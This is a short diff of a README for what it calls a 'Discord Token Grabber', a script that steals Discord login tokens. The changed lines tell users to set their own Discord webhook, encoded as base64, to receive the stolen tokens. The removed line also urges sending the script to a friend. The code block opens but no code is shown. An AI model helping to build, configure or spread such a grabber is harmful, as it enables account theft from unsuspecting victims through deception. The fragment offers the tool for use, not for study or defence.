@@ -1,5 +1,5 @@
 # Discord Token Grabber
-### chage the part at atob with your discord webhook (encode base64) and send the script to your friend!
+### change the value of nitrocode to your discord webhook as base64!
 ## A simple token grabber lol
 
 ```js
